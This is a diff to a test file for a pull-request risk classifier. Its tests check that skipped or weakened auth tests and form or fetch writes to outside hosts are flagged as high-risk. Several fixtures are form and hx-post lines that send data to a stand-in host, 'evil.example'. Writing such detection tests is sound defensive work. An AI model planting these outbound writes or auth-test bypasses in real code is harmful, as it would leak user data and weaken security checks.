@@ -432,11 +432,17 @@ test('a change to the repo risk policy file is tier 2, a nested file of that nam
   assert.equal(tier(file('docs/.github/risk-paths.txt', { add: ['x'] })), 1);
 });
 
-test('risk-tier.mjs without --pr takes risk-paths.txt from the base ref, not the working tree', () => {
+test('risk-tier.mjs without --pr takes risk-paths.txt from the base ref, not the working tree, from any directory', () => {
   const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'bstack-tier-cli-'));
   const git = (...a) => execFileSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' });
-  const cli = () => JSON.parse(execFileSync(process.execPath, [SCRIPT, '--base', 'main'], { cwd: repo, encoding: 'utf8' }));
   const listed = 'listed in .github/risk-paths.txt: app/main.py';
+  const tier2FromRootAndSubdir = () => {
+    for (const cwd of [repo, path.join(repo, 'app')]) {
+      const r = JSON.parse(execFileSync(process.execPath, [SCRIPT, '--base', 'main'], { cwd, encoding: 'utf8' }));
+      assert.equal(r.tier, 2, `${cwd}: ${r.reasons.join('; ')}`);
+      assert.ok(r.reasons.includes(listed), `${cwd}: ${r.reasons.join('; ')}`);
+    }
+  };
   try {
     git('init', '-q', '-b', 'main');
     fs.mkdirSync(path.join(repo, '.github'));
@@ -448,10 +454,10 @@ test('risk-tier.mjs without --pr takes risk-paths.txt from the base ref, not the
     git('checkout', '-q', '-b', 'feat');
     fs.writeFileSync(path.join(repo, 'app', 'main.py'), 'x = 1\n');
     fs.writeFileSync(path.join(repo, '.github', 'risk-paths.txt'), '# edited locally\n');
-    assert.ok(cli().reasons.includes(listed));
+    tier2FromRootAndSubdir();
     fs.rmSync(path.join(repo, '.github', 'risk-paths.txt'));
     git('commit', '-q', '-am', 'drop the policy');
-    assert.ok(cli().reasons.includes(listed));
+    tier2FromRootAndSubdir();
   } finally {
     fs.rmSync(repo, { recursive: true, force: true });
   }
@@ -575,11 +581,139 @@ test('an auth-named test file that only drops a literal list item and adds tests
   assert.equal(r.tier, 1, r.reasons.join('; '));
 });
 
-test('a huge line of unclosed form tags is classified quickly', () => {
-  const line = 'method="post" ' + ('<form a=' + 'x'.repeat(50)).repeat(20000);
-  const started = Date.now();
-  outcome('templates/big.html', { add: [line] });
-  assert.ok(Date.now() - started < 2000, `${Date.now() - started} ms`);
+const weakenedAuthTest = (p, opts) => {
+  const r = outcome(p, opts);
+  assert.equal(r.tier, 2, `${p}: ${r.reasons.join('; ')}`);
+};
+
+test('#148: pytest.skip added to an auth-named test is tier 2', () => weakenedAuthTest('tests/test_login.py', { add: ['    pytest.skip("flaky")'] }));
+test('#148: #[ignore = reason] added to an auth-named test is tier 2', () => weakenedAuthTest('crates/app/tests/login.rs', { add: ['#[ignore = "flaky on CI"]'] }));
+test('#148: t.Skip added to an auth-named Go test is tier 2', () => weakenedAuthTest('auth_test.go', { add: ['\tt.Skip("later")'] }));
+test('#148: a bare return added to an auth-named Python test is tier 2', () => weakenedAuthTest('tests/test_session.py', { add: ['    return'] }));
+test('#148: a conditional return added to an auth-named TS test is tier 2', () => weakenedAuthTest('web/auth.test.ts', { add: ['  if (process.env.CI) return;'] }));
+test('#148: a dependency override added to an auth-named test is tier 2', () => weakenedAuthTest('tests/test_auth.py', { add: ['app.dependency_overrides[require_admin] = lambda: ADMIN'] }));
+test('#148: dropping a literal item from an auth-named test list is tier 2', () => weakenedAuthTest('tests/test_permissions.py', { del: ['    "/admin/users",'] }));
+
+test('#148: a skip added to any test file is a weakened test', () => {
+  for (const [p, line] of [['tests/test_models.py', '    pytest.skip("later")'], ['crates/app/tests/models.rs', '#[ignore = "slow"]'], ['models_test.go', '\tt.Skip("later")']]) {
+    const r = outcome(p, { add: [line] });
+    assert.ok(r.reasons.includes(`test skipped: ${p}`), `${line}: ${r.reasons.join('; ')}`);
+  }
+});
+
+const outboundForm = line => {
+  const p = 'templates/pay.html';
+  const r = outcome(p, { add: [line] });
+  assert.ok(r.reasons.includes(`outbound call with side effects: ${p}`), `${line}: ${r.reasons.join('; ')}`);
+};
+
+test('#148: a form action behind a template variable that is not the app base is outbound', () => outboundForm('<form method="post" action="{{ payment_gateway_url }}/charge">'));
+test('#148: an hx-post behind a template variable that is not the app base is outbound', () => outboundForm('<form method="post" hx-post="{{ webhook_url }}/notify">'));
+test('#148: a data-hx-post or data-hx-delete to an absolute URL is outbound', () => {
+  outboundForm('<form method="post" action="/x" data-hx-post="https://evil.example/x">');
+  outboundForm('<form method="post" action="/x" data-hx-delete="https://evil.example/x">');
+});
+
+test('a huge line of unclosed form tags costs about as much as a same-size line without forms', () => {
+  const lineOf = tag => 'method="post" ' + (`<${tag} a=` + 'x'.repeat(50)).repeat(20000);
+  const fastest = line => Math.min(...[1, 2, 3].map(() => {
+    const started = process.hrtime.bigint();
+    outcome('templates/big.html', { add: [line] });
+    return Number(process.hrtime.bigint() - started);
+  }));
+  const forms = fastest(lineOf('form'));
+  const plain = fastest(lineOf('from'));
+  assert.ok(forms < 50 * plain, `forms ${forms} ns, plain ${plain} ns`);
+});
+
+const OUTBOUND = p => `outbound call with side effects: ${p}`;
+
+test('#147: a same-origin write formatted over several lines or with a nested options object is not an outbound call', () => {
+  for (const [p, add] of [
+    ['static/app.js', ["fetch('/api/save', {", "  method: 'POST',", '  body,', '});']],
+    ['static/app.js', ["fetch('/api/save', {method:'POST', headers:{'Content-Type':'application/json'}, body})"]],
+    ['templates/save.html', ['<form', '  method="post"', '  action="/save">']],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(!r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 1, `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('#147: the multi-line and nested shapes to an absolute or non-app template URL are still outbound', () => {
+  for (const [p, add] of [
+    ['static/app.js', ["fetch('https://api.example.com/save', {", "  method: 'POST',", '  body,', '});']],
+    ['static/app.js', ['fetch(`${apiBase}/save`, {', "  method: 'POST',", '  body,', '});']],
+    ['static/app.js', ["fetch('https://api.example.com/save', {method:'POST', headers:{'Content-Type':'application/json'}, body})"]],
+    ['static/app.js', ["fetch('/save', {method:'POST', headers:{'X-A':'1'}, baseURL: 'https://api.example.com'})"]],
+    ['static/app.js', ["fetch('/save', {", "  method: 'POST',", "  agent: { base: 'https://api.example.com' },", '});']],
+    ['templates/pay.html', ['<form', '  method="post"', '  action="https://pay.example.com/charge">']],
+    ['templates/pay.html', ['<form', '  method="post"', '  action="{{ payment_gateway_url }}/charge">']],
+    ['templates/pay.html', ['<form', '  method="post"', '  action="/x"><button formaction="https://evil.example/x">']],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 2);
+  }
+});
+
+test('#147: a write method in a later, separate statement than its same-origin fetch is still outbound', () => {
+  const p = 'static/app.js';
+  for (const add of [
+    ["fetch('/api/save', {", '  body,', '});', "init.method = 'POST';"],
+    ['const opts = { body };', "fetch('/api/save', opts);", "opts.method = 'POST';"],
+    ["fetch('/api/save', { body }); const opts = {", "  method: 'POST',", '};', 'send(opts);'],
+    ["// fetch('/api/save', {", "  method: 'POST',", '});'],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 2);
+  }
+  const split = riskTier(hunk(p, ["+fetch('/api/save', {", '   body,', "+  method: 'POST',", '+});']).join('\n'));
+  assert.ok(split.reasons.includes(OUTBOUND(p)), `method in another added block: ${split.reasons.join('; ')}`);
+});
+
+test('#147: a write call nested in a same-origin fetch\'s options is still outbound', () => {
+  const p = 'static/app.js';
+  for (const add of [
+    ["fetch('/api/log', { body: String(await fetch(remoteUrl, { method: 'POST' })) })"],
+    ["fetch('/api/log', { body: JSON.stringify(await post(remote, { method: 'POST' })) })"],
+    ["fetch('/api/log', {", '  body: await send(remoteUrl, {', "    method: 'DELETE',", '  }),', '})'],
+    ["fetch('/api/log', { body: `${await fetch(remoteUrl, { method: 'POST' })}` })"],
+    ["fetch('/api/log', {", "  method: 'POST',", "  body: `${await fetch(remoteUrl, { method: 'DELETE' })}`,", '})'],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 2);
+  }
+});
+
+test('#147: a semicolon inside a quoted option and an app-path formaction keep the exemption', () => {
+  for (const [p, add] of [
+    ['static/app.js', ["fetch('/api/x', {method:'POST', body: 'a;b'})"]],
+    ['static/app.js', ["fetch('/api/x', {", "  method: 'POST',", "  headers: {'Content-Type': 'application/json; charset=utf-8'},", '});']],
+    ['templates/save.html', ['<form method="post" action="/save"><button formaction="/save/draft">']],
+    ['templates/save.html', ['<form', '  method="post"', '  action="/save">', '  <button formaction="{{ base }}/save/draft">Draft</button>']],
+  ]) {
+    const r = outcome(p, { add });
+    assert.equal(r.tier, 1, `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+  }
+  for (const add of [['<form', '  method="post"', '  action="/save">', '  <button formaction="{{ payment_url }}/x">'], ['<form method="post" action="/save"><button formaction=/x>']]) {
+    const r = outcome('templates/save.html', { add });
+    assert.equal(r.tier, 2, `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('#147: a huge added block of unclosed fetch calls costs about as much as a same-size block without them', () => {
+  const blockOf = call => [`${call}('/x', {`, "  method: 'POST',", ...Array.from({ length: 20000 }, () => `${call}('/x', {` + '{a:1},'.repeat(10))];
+  const fastest = add => Math.min(...[1, 2, 3].map(() => {
+    const started = process.hrtime.bigint();
+    outcome('static/big.js', { add });
+    return Number(process.hrtime.bigint() - started);
+  }));
+  const fetches = fastest(blockOf('fetch'));
+  const plain = fastest(blockOf('fletch'));
+  assert.ok(fetches < 50 * plain, `fetches ${fetches} ns, plain ${plain} ns`);
 });
 
 test('a file named like a test but not counted as a test keeps the auth rule', () => {
